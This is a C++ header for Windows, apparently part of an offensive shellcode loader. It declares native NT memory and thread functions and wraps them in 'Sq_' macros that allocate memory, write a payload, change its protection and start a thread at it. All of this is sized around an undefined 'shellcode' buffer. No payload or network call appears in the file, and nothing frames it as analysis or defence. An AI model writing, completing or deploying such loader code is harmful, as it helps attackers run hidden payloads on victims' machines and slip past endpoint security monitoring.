#pragma once
#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

extern "C" {
    NTSTATUS NTAPI NtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    NTSTATUS NTAPI NtProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );

    NTSTATUS NTAPI NtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T BufferSize,
        PSIZE_T NumberOfBytesWritten
    );

    NTSTATUS NTAPI NtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        ULONG_PTR ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    );

    NTSTATUS NTAPI NtWaitForSingleObject(
        HANDLE Handle,
        BOOLEAN Alertable,
        PLARGE_INTEGER Timeout
    );

    NTSTATUS NTAPI NtFreeVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG FreeType
    );

    NTSTATUS NTAPI NtClose(
        HANDLE Handle
    );
}

HANDLE processHandle = GetCurrentProcess();
PVOID baseAddress = NULL;
SIZE_T regionSize = sizeof(shellcode);
ULONG allocationType = MEM_COMMIT | MEM_RESERVE;
ULONG protect = PAGE_READWRITE;
ULONG oldProtect;
NTSTATUS status;
HANDLE threadHandle;
SIZE_T bytesWritten;

#define Sq_AllocateMemory(baseAddress, regionSize, allocationType, protect) \
    do { \
        status = NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize, allocationType, protect); \
        if (status != STATUS_SUCCESS) { \
            printf("NtAllocateVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_WriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize) \
    do { \
        SIZE_T bytesWritten; \
        status = NtWriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize, &bytesWritten); \
        if (status != STATUS_SUCCESS || bytesWritten != (SIZE_T)bufferSize) { \
            printf("NtWriteVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_ProtectVirtualMemory(processHandle, baseAddress, regionSize, protect) \
    do { \
        ULONG oldProtect; \
        status = NtProtectVirtualMemory(processHandle, &baseAddress, &regionSize, protect, &oldProtect); \
        if (status != STATUS_SUCCESS) { \
            printf("NtProtectVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_CreateThreadEx(threadHandle, processHandle, baseAddress) \
    do { \
        NTSTATUS status; \
        status = NtCreateThreadEx(&threadHandle, GENERIC_EXECUTE, NULL, processHandle, baseAddress, NULL, 0, 0, 0, 0, NULL); \
        if (status != STATUS_SUCCESS) { \
            printf("NtCreateThreadEx failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_WaitForSingleObject(threadHandle) \
    do { \
        NTSTATUS status; \
        status = NtWaitForSingleObject(threadHandle, FALSE, NULL); \
        if (status != STATUS_SUCCESS) { \
            printf("NtWaitForSingleObject failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_Close(handle) \
    do { \
        NTSTATUS status; \
        status = NtClose(handle); \
        if (status != STATUS_SUCCESS) { \
            printf("NtClose failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)


#define Sq_FreeVirtualMemory(processHandle, baseAddress, regionSize) \
    do { \
        NTSTATUS status; \
        status = NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, MEM_RELEASE); \
        if (status != STATUS_SUCCESS) { \
            printf("NtFreeVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)
